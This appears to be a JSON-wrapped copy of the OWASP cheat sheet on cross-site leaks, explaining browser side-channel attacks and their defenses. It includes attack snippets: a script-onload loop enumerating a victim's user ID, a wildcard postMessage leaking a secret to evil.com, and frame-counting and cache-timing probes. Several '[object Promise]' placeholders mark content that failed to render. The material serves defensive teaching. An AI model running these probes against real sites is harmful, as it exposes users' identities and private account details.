      "XS_Leaks_Cheat_Sheet.md": "# Cross-site leaks Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article describes examples of attacks and defenses against cross-site leaks vulnerability (XS Leaks). Since this vulnerability is based on the core mechanism of modern web browsers, it's also called a browser side-channel attack. XS-Leaks attacks seek to exploit the fact of seemingly insignificant information that is exchanged in cross-site communications between sites. This information infers answers to the previously asked questions about the victim's user account. Please take a look at the examples provided below:\r\n\r\n- Is the user currently logged in?\r\n- Is the user ID 1337?\r\n- Is the user an administrator?\r\n- Does the user have a person with a particular email address in their contact list?\r\n\r\nOn the basis of such questions, the attacker might try to deduce the answers, depending on the application's context. In most cases, the answers will be in binary form (yes or no). The impact of this vulnerability depends strongly on the application's risk profile. Despite this, XS Leaks may pose a real threat to user privacy and anonymity.\r\n\r\n## Attack vector\r\n\r\n[object Promise]\r\n\r\n- The entire attack takes place on the victim's browser side - just like an XSS attack\r\n- In some cases, the victim must remain on the attacker's site longer for the attack to succeed.\r\n\r\n## Same Origin Policy (SOP)\r\n\r\nBefore describing attacks, it's good to understand one of the most critical security mechanisms in browsers - The Same-origin Policy. A few key aspects:\r\n\r\n- Two URLs are considered as **same-origin** if their **protocol**, **port**, and **host** are the same\r\n- Any origin can send a request to another source, but due to the Same-origin Policy, they will not be able to read the response directly\r\n- Same Origin Policy may be relaxed by [Cross Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).\r\n\r\n| Origin A              | Origin B                  | Same origin?                   |\r\n| -------------         | -------------             | -------------                  |\r\n| `https://example.com` | `http://sub.example.com`  | No, different hosts             |\r\n| `https://example.com` | `https://example.com:443` | Yes! Implicit port in Origin A |\r\n\r\nAlthough the SOP principle protects us from accessing information in cross-origin communication, XS-Leaks attacks based on residual data can infer some information.\r\n\r\n## SameSite Cookies\r\n\r\nThe SameSite attribute of a cookie tells the browser whether it should include the cookie in the request from the other site. The SameSite attribute takes the following values:\r\n\r\n- `None` -  the cookie will be attached to a request from another site, but it must be sent over a secure HTTPS channel\r\n- `Lax` - the cookie will be appended to the request from another page if the request method is GET and the request is made to top-level navigation (i.e. the navigation changes the address in the browser top bar)\r\n- `Strict` - the cookie will never be sent from another site\r\n\r\nIt is worth mentioning here the attitude of Chromium based browsers in which cookies without SameSite attribute set by default are treated as Lax.\r\n\r\nSameSite cookies are a strong **defense-in-depth** mechanism against **some** classes of XS Leaks and [CSRF attacks](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), which can significantly reduce the attack surface, but may not completely cut them (see, e.g., [window-based XS Leak](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/xs-leaks.html) attacks like [frame counting](https://xsleaks.dev/docs/attacks/frame-counting/) and [navigation](https://xsleaks.dev/docs/attacks/navigations/)).\r\n\r\n### How do we know that two sites are SameSite?\r\n\r\n[object Promise]\r\n\r\nIn the context of the SameSite attribute, we consider the site to be the combination of the TLD (top-level domain) and the domain name before it. For example:\r\n\r\n| Full URL                                      | Site (eTLD+1)             |\r\n| --------------------------------------------  | ------------------------  |\r\n| `https://example.com:443/data?query=test`     | `example.com`             |\r\n\r\nWhy are we talking about eTLD+1 and not just TLD+1? It's because of domains like `.github.io` or `.eu.org`. Such parts are not atomic enough to be compared well. For this reason, a list of \"effective\" TLDs (eTLDs) was created and can be found [here](https://publicsuffix.org/list/public_suffix_list.dat).\r\n\r\nSites that have the same eTLD+1 are considered SameSite, examples:\r\n\r\n| Origin A                  | Origin B                   | SameSite?                    |\r\n| ------------------------- | -------------------------- | ---------------------        |\r\n| `https://example.com`     | `http://example.com`       | Yes, schemes don't matter    |\r\n| `https://evil.net`        | `https://example.com`      | No, different eTLD+1          |\r\n| `https://sub.example.com` | `https://data.example.com` | Yes, subdomains don't matter |\r\n\r\nFor more information about SameSite, see the excellent article [Understanding \"same-site\"](https://web.dev/same-site-same-origin/).\r\n\r\n## Attacks using the element ID attribute\r\n\r\nElements in the DOM can have an ID attribute that is unique within the document. For example:\r\n\r\n```html\r\n<button id=\"pro\">Pro account</button>\r\n```\r\n\r\nThe browser will automatically focus on an element with a given ID if we append a hash to the URL, e.g. `https://example.com#pro`. What's more, the JavaScript [focus event](https://developer.mozilla.org/en-US/docs/Web/API/Element/focus_event) gets fired. The attacker may try to embed the application in the iframe with specific source on its own controlled page:\r\n\r\n[object Promise]\r\n\r\nthen add listener in main document for [blur event](https://developer.mozilla.org/en-US/docs/Web/API/Element/blur_event) (the opposite of focus). When the victim visits the attackers site, the blur event gets fired. The attacker will be able to conclude that the victim has a pro account.\r\n\r\n### Defense\r\n\r\n#### Framing protection\r\n\r\nIf you don't need other origins to embed your application in a frame, you can consider using one of two mechanisms:\r\n\r\n- **Content Security Policy frame ancestors** directive. [Read more about syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src).\r\n- **X-Frame-Options**  - mainly if you want to support old browsers.\r\n\r\nSetting up framing protection efficiently blocks the ability to embed your application in a frame on the attacker-controlled origin and protects from other attacks like [Clickjacking](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\r\n\r\n#### Fetch metadata (Sec-Fetch-Dest)\r\n\r\nSec-Fetch-Dest header provides us with a piece of information about what is the end goal of the request. This header is included automatically by the browser and is one of the headers within the Fetch Metadata standard.\r\n\r\nWith Sec-Fetch-Dest you can build effective own resource isolation policies, for example:\r\n\r\n```javascript\r\napp.get('/', (req, res) => {\r\n    if (req.get('Sec-Fetch-Dest') === 'iframe') {\r\n        return res.sendStatus(403);\r\n    }\r\n    res.send({\r\n        message: 'Hello!'\r\n    });\r\n});\r\n```\r\n\r\n[object Promise]\r\n\r\nIf you want to use headers from the Fetch Metadata standard, make sure that your users' browsers support this standard (you can check it [here](https://caniuse.com/?search=sec-fetch)). Also, think about using the appropriate fallback in code if the Sec-Fetch-* header is not included in the request.\r\n\r\n## Attacks based on error events\r\n\r\nEmbedding from resources from other origins is generally allowed. For example, you can embed an image from another origin or even script on your page. What is not permitted is reading cross-origin resource due the SOP policy.\r\n\r\nWhen the browser sends a request for a resource, the server processes the request and decides on the response e.g. (200 OK or 404 NOT FOUND). The browser receives the HTTP response and based on that, the appropriate JavaScript event is fired (onload or onerror).\r\n\r\nIn this way, we can try to load resources and, based on the response status, infer whether they exist or not in the context of the logged-in victim. Let's look at the following situation:\r\n\r\n- `GET /api/user/1234` - 200 OK - currently logged-in user is 1234 because we successfully loaded resource ([onload](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onload) event fired)\r\n- `GET /api/user/1235` - 401 Unauthorized  - 1235 is not the ID of the currently logged in user ([onerror](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror) event will be triggered)\r\n\r\nGiven the above example, an attacker can use JavaScript on his controlled origin to guess the victim's ID by enumerating over all the values in a simple loop.\r\n\r\n```javascript\r\nfunction checkId(id) {\r\n    const script = document.createElement('script');\r\n    script.src = `https://example.com/api/users/${id}`;\r\n    script.onload = () => {\r\n        console.log(`Logged user id: ${id}`);\r\n    };\r\n    document.body.appendChild(script);\r\n}\r\n\r\n// Generate array [0, 1, ..., 40]\r\nconst ids = Array(41)\r\n    .fill()\r\n    .map((_, i) => i + 0);\r\n\r\nfor (const id of ids) {\r\n    checkId(id);\r\n}\r\n```\r\n\r\nNote that the attacker here does not care about reading the response body even though it would not be able to due to solid isolation mechanisms in browsers such as [Cross-Origin Resource Blocking](https://www.chromium.org/Home/chromium-security/corb-for-developers). All it needs is the success information it receives when the `onload` event fires.\r\n\r\n### Defense\r\n\r\n#### SubResource protection\r\n\r\nIn some cases, mechanism of special unique tokens may be implemented to protect our sensitive endpoints.\r\n\r\n```\r\n/api/users/1234?token=be930b8cfb5011eb9a030242ac130003\r\n```\r\n\r\n- Token should be long and unique\r\n- The back-end must correctly validate the token passed in the request\r\n\r\nAlthough it is pretty effective, the solution generates a significant overhead in proper implementation.\r\n\r\n#### Fetch metadata (Sec-Fetch-Site)\r\n\r\nThis header specifies where the request was sent from, and it takes the following values:\r\n\r\n- `cross-site`\r\n- `same-origin`\r\n- `same-site`\r\n- `none` - user directly reached the page\r\n\r\nLike Sec-Fetch-Dest, this header is automatically appended by the browser to each request and is part of the Fetch Metadata standard. Example usage:\r\n\r\n```javascript\r\napp.get('/api/users/:id', authorization, (req, res) => {\r\n    if (req.get('Sec-Fetch-Site') === 'cross-site') {\r\n        return res.sendStatus(403);\r\n    }\r\n\r\n    // ... more code\r\n\r\n    return res.send({ id: 1234, name: 'John', role: 'admin' });\r\n});\r\n```\r\n\r\n#### Cross-Origin-Resource-Policy (CORP)\r\n\r\nIf the server returns this header with the appropriate value, the browser will not load resources from our site or origin (even static images) in another application. Possible values:\r\n\r\n- `same-site`\r\n- `same-origin`\r\n- `cross-origin`\r\n\r\nRead more about CORP [here](https://resourcepolicy.fyi/).\r\n\r\n## Attacks on postMessage communication\r\n\r\nSometimes in controlled situations we would like, despite SOP, to exchange information between different origins. We can use the postMessage mechanism. See below example:\r\n\r\n```javascript\r\n// Origin: http://example.com\r\nconst site = new URLSearchParams(window.location.search).get('site'); // https://evil.com\r\nconst popup = window.open(site);\r\npopup.postMessage('secret message!', '*');\r\n\r\n// Origin: https://evil.com\r\nwindow.addEventListener('message', e => {\r\n    alert(e.data) // secret message! - leak\r\n});\r\n```\r\n\r\n### Defense\r\n\r\n#### Specify strict targetOrigin\r\n\r\nTo avoid situations like the one above, where an attacker manages to get the reference for a window to receive a message, always specify the exact `targetOrigin` in postMessage. Passing to the `targetOrigin` wildcard `*` causes any origin to receive the message.\r\n\r\n```javascript\r\n// Origin: http://example.com\r\nconst site = new URLSearchParams(window.location.search).get('site'); // https://evil.com\r\nconst popup = window.open(site);\r\npopup.postMessage('secret message!', 'https://sub.example.com');\r\n\r\n// Origin: https://evil.com\r\nwindow.addEventListener('message', e => {\r\n    alert(e.data) // no data!\r\n});\r\n```\r\n\r\n## Frame counting attacks\r\n\r\nInformation about the number of loaded frames in a window can be a source of leakage. Take for example an application that loads search results into a frame, if the results are empty then the frame does not appear.\r\n\r\n[object Promise]\r\n\r\nAn attacker can get information about the number of loaded frames in a window by counting the number of frames in a `window.frames` object.\r\n\r\nSo finally, an attacker can obtain the email list and, in a simple loop, open subsequent windows and count the number of frames. If the number of frames in the opened window is equal to 1, the email is in the client's database of the application used by the victim.\r\n\r\n### Defense\r\n\r\n#### Cross-Origin-Opener-Policy (COOP)\r\n\r\nSetting this header will prevent cross-origin documents from opening in the same browsing context group. This solution ensures that document A opening another document will not have access to the `window` object. Possible values:\r\n\r\n- `unsafe-none`\r\n- `same-origin-allow-popups`\r\n- `same-origin`\r\n\r\nIn case the server returns for example `same-origin` COOP header, the attack fails:\r\n\r\n```javascript\r\nconst win = window.open('https://example.com/admin/customers?search=john%40example.com');\r\nconsole.log(win.frames.length) // Cannot read property 'length' of null\r\n```\r\n\r\n## Attacks using browser cache\r\n\r\nBrowser cache helps to significantly reduce the time it takes for a page to load when revisited. However, it can also pose a risk of information leakage. If an attacker is able to detect whether a resource was loaded from the cache after the load time, he will be able to draw some conclusions based on it.\r\n\r\nThe principle is simple, a resource loaded from cache memory will load incomparably faster than from the server.\r\n\r\n[object Promise]\r\n\r\nAn attacker can embed a resource on their site that is only accessible to a user with the admin role. Then, using JavaScript, read the load time of a particular resource and, based on this information, deduce whether the resource is in cache or not.\r\n\r\n```javascript\r\n    // Threshold above which we consider a resource to have loaded from the server\r\n    // const THRESHOLD = ...\r\n\r\n    const adminImagePerfEntry = window.performance\r\n        .getEntries()\r\n        .filter((entry) => entry.name.endsWith('admin.svg'));\r\n\r\n    if (adminImagePerfEntry.duration < THRESHOLD) {\r\n        console.log('Image loaded from cache!')\r\n    }\r\n```\r\n\r\n### Defense\r\n\r\n#### Unpredictable tokens for images\r\n\r\nThis technique is accurate when the user wants the resources to still be cached, while an attacker will not be able to find out about it.\r\n\r\n```\r\n/avatars/admin.svg?token=be930b8cfb5011eb9a030242ac130003\r\n```\r\n\r\n- Tokens should be unique in context of each user\r\n- If an attacker cannot guess this token, it will not be able to detect whether the resource was loaded from cache\r\n\r\n#### Using the Cache-Control header\r\n\r\nYou can disable the cache mechanism if you accept the degraded performance related to the necessity of reloading resources from the server every time a user visits the site. To disable caching for resources you want to protect, set the response header `Cache-Control: no-store`.\r\n\r\n## Quick recommendations\r\n\r\n- If your application uses cookies, make sure to set the appropriate [SameSite attribute](#samesite-cookies).\r\n- Think about whether you really want to allow your application to be embedded in frames. If not, consider using the mechanisms described in the [framing protection](#framing-protection) section.\r\n- To strengthen the isolation of your application between other origins, use [Cross Origin Resource Policy](#cross-origin-resource-policy-corp) and [Cross Origin Opener Policy](#cross-origin-opener-policy-coop) headers with appropriate values.\r\n- Use the headers available within Fetch Metadata to build your own resource isolation policy.\r\n\r\n## References\r\n\r\n### XS Leaks\r\n\r\n- [XS Leaks Wiki](https://xsleaks.dev/)\r\n- [XS Leaks Attacks & Prevention](https://www.appsecmonkey.com/blog/xs-leaks)\r\n\r\n### Fetch Metadata\r\n\r\n- [Fetch Metadata and Isolation Policies](https://www.appsecmonkey.com/blog/fetch-metadata)\r\n- [Protect your resources from attacks with Fetch Metadata](https://web.dev/fetch-metadata/)\r\n\r\n### Framing protection\r\n\r\n- [Preventing framing with policies](https://pragmaticwebsecurity.com/articles/securitypolicies/preventing-framing-with-policies.html)\r\n- [CSP 'frame-ancestors' policy](https://content-security-policy.com/frame-ancestors/)\r\n\r\n### SameSite\r\n\r\n- [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)\r\n- [SameSite cookies recipes](https://web.dev/samesite-cookie-recipes/)\r\n\r\n### COOP and CORP header\r\n\r\n- [Making your site \"cross-origin isolated\"](https://web.dev/coop-coep/)\r\n- [MDN Web Docs about CORP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_%28CORP%29)\r\n"
    }
  ]
}